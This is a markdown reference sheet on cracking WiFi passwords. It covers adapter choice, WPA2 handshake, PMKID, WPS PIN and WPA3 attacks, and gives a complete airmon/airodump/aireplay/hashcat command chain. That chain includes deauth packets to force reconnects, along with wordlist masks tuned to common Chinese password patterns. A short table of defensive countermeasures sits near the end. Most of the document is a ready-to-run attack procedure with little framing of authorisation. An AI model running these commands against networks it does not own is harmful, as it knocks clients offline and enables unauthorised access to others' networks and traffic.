# WiFi Cracking — Complete Knowledge Bank

## Hardware Requirements

**Without a compatible WiFi adapter in monitor mode, WiFi cracking is impossible on this machine.** The Dell (Intel I219-V Ethernet only) has no WiFi hardware. Two paths:

| Path | Cost | Capability |
|------|------|------------|
| **Alfa AWUS036ACH** (USB) | ~¥150 | Full monitor mode + injection, 2.4+5GHz, Kali-ready |
| **Mac Kali** + built-in WiFi | Free | May detect networks, may lack monitor mode |

### Compatible Adapters

| Adapter | Chipset | Price | Bands | Notes |
|---------|---------|-------|-------|-------|
| **Alfa AWUS036ACH** | RTL8812AU | ~¥150 | 2.4+5GHz | Most popular, well-documented |
| Alfa AWUS036ACM | RTL8821AU | ~¥120 | 2.4+5GHz | USB-C, compact |
| Panda PAU09 | RTL8812AU | ~¥100 | 2.4+5GHz | Budget option |
| TP-Link TL-WN722N v1 | AR9271 | ~¥80 | 2.4GHz only | Must be **v1** (v2 uses different chip) |
| Panda PAU05 | RTL8188EU | ~¥60 | 2.4GHz only | Cheapest |

### Incompatible (avoid)
- Intel built-in WiFi (most models block monitor mode in firmware)
- Broadcom chipsets (closed-source drivers)
- Realtek RTL8188CU (unstable Linux drivers)

## Four Attack Modes

### Mode A: WPA2-PSK Dictionary Attack

**How it works:** When a client connects to a WPA2 network, a 4-way handshake occurs. The handshake contains enough encrypted data to verify a password guess offline.

**Requirements:**
- ✅ WiFi adapter in monitor mode
- ✅ At least one client connected to the target network
- ✅ Capture the complete 4-way handshake
- ✅ A password dictionary (e.g., rockyou.txt)

**Limitations:**
- Password must be in the dictionary
- Long/random passwords are effectively uncrackable
- Needs a real client to be connecting (or deauth-triggered reconnect)

### Mode B: PMKID Attack (No Client Needed)

**How it works:** Some routers include a PMKID (Pairwise Master Key Identifier) in the first EAPOL frame of the handshake, even during initial association. If present, cracking requires no deauth and no client.

**Requirements:**
- ✅ WiFi adapter in monitor mode
- ✅ Target router that sends PMKID (common on many routers)
- ✅ `hcxdumptool` to capture

**Advantages over Mode A:**
- ❌ No client needed
- ❌ No deauth (stealthier)
- ❌ No waiting for reconnection

**Affected routers:** Huawei, TP-Link (many models), most 2018+ routers with roaming support enabled.

### Mode C: WPS PIN Attack

**How it works:** WPS allows PIN-based enrollment. The PIN is 8 digits, validated in two halves (first 4 digits = separate checksum). Max 11,000 attempts.

**Requirements:**
- ✅ WiFi adapter in monitor mode
- ✅ Target has WPS enabled
- ✅ WPS not in "locked" state (after ~3 wrong attempts some routers lock for 1-5 minutes)

**Tools:** `reaver`, `bully`, `pixiewps`

**Effectiveness:**
- Old routers (pre-2015): Often 100% success rate
- New routers: Most have WPS rate-limiting or disabled by default
- WPS 2.0: Lockout after 3 failed PIN attempts

### Mode D: WPA3 Attack

**How it works:** WPA3 uses SAE (Simultaneous Authentication of Equals) instead of 4-way handshake. Dragonblood vulnerabilities (2019) allow downgrade and side-channel attacks on some implementations.

**Requirements:**
- ✅ Rare — WPA3 is not widely deployed
- ✅ Requires specific vulnerable implementation
- ✅ Tools: `bettercap`, `hwpsub`

**Effectiveness:** Low for most targets. WPA3 is designed specifically to fix WPA2's offline dictionary attack weakness.

## Full Attack Chain

```
┌─────────────────────────────────────────────────────────────────┐
│                    WiFi Cracking Pipeline                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Step 1: Enable monitor mode                                    │
│  ──────────────────────────                                     │
│  sudo airmon-ng start wlan0                                     │
│  → wlan0mon created                                             │
│                                                                 │
│  Step 2: Survey the environment                                 │
│  ───────────────────────────────                                │
│  sudo airodump-ng wlan0mon                                      │
│  → Lists: BSSID, CH, ENC, ESSID, Power, #Client                │
│                                                                 │
│  Step 3: Target a specific AP                                   │
│  ─────────────────────────────                                   │
│  sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon  │
│  → Capture file: capture-01.cap                                 │
│                                                                 │
│  Step 4a: Wait for handshake (passive)                          │
│  ─────────────────────────────────────                           │
│  Watch top-right of airodump-ng output:                         │
│  "WPA handshake: XX:XX:XX:XX:XX:XX"                            │
│                                                                 │
│  Step 4b: Force handshake via deauth (active)                   │
│  ───────────────────────────────────────────                    │
│  sudo aireplay-ng -0 2 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon  │
│  → Sends 2 deauth packets → client reconnects → handshake       │
│                                                                 │
│  Step 5: Crack the handshake                                    │
│  ─────────────────────────────────────                           │
│  Method 1: aircrack-ng (CPU, slow)                              │
│  aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap │
│                                                                 │
│  Method 2: hashcat (GPU, fast) — preferred                     │
│  # Convert capture to hashcat format                            │
│  hcxpcapngtool -o capture.hc22000 capture-01.cap               │
│                                                                 │
│  # Crack with dictionary                                        │
│  hashcat -m 22000 -a 0 capture.hc22000 rockyou.txt --force      │
│                                                                 │
│  # Crack with rules (more coverage)                             │
│  hashcat -m 22000 -a 0 capture.hc22000 rockyou.txt              │
│         -r /usr/share/hashcat/rules/best64.rule                  │
│                                                                 │
│  # Show cracked result                                          │
│  hashcat -m 22000 capture.hc22000 --show                        │
```

## Dictionary Preparation

| Dictionary | Size | Contents |
|------------|------|----------|
| **rockyou.txt** | 14GB full / 134MB compressed | ~14M real-world passwords from 2009 breach |
| **crunch 8 8 0123456789** | ~860MB | All 10^8 8-digit numeric (common Chinese WiFi pattern) |
| **SecLists/Passwords** | 500MB+ | Common passwords, keyboard walks, leaked corp lists |
| **Custom WiFi list** | varies | 138xxxx, 188xxxx phone number prefixes |

## hashcat Modes for WiFi

| Mode | Algorithm | File Format |
|------|-----------|-------------|
| 2500 | WPA/WPA2 | `.hccapx` (legacy, less preferred) |
| 22000 | WPA/WPA2/WPA3 PMKID | `.hc22000` / `.22000` (current standard) |
| 22001 | WPA3 | Same `.22000` format |

## Common WiFi Password Patterns (China)

Based on domestic router defaults and user behavior:

| Pattern | Example | Crack approach |
|---------|---------|----------------|
| 8-digit numeric | `12345678`, `88888888` | crunch mask `?d?d?d?d?d?d?d?d` |
| Phone number | `13800138000` (11 digits) | Common prefixes + 8 digits |
| Pinyin word + number | `zhangsan123` | Dictionary + `?d?d?d` |
| Chinese brand default | `tp-link123`, `CMCC2024` | Weak passwords list |
| English word + year | `password2024` | rockyou.txt covers this |

## Defensive Countermeasures

| Defense | What it stops | Effectiveness |
|---------|--------------|---------------|
| **WPA3** | Dictionary attacks, PMKID | 🟢 Strongest |
| WPA2-AES (not TKIP) | TKIP-specific attacks | 🟢 Required |
| 20+ char random password | Dictionary attacks | 🟢 Makes cracking infeasible |
| **Disable WPS** | WPS PIN brute-force | 🟢 Critical |
| Disable PMKID broadcast | PMKID attack | 🟡 Helpful |
| MAC filtering | Casual freeloading | 🔴 Easily bypassed (MAC spoofing) |
| Hide SSID | Discovery deterrence | 🔴 Not hidden from airodump-ng |
| Lower TX power | Range reduction | 🟡 Limits attack distance |

## References

- `nmap-live-scan-example.md` — Real-world Nmap scan methodology with 88-host network findings
- `two-machine-lab-setup.md` — Setting up a two-machine LAN for physical attackers
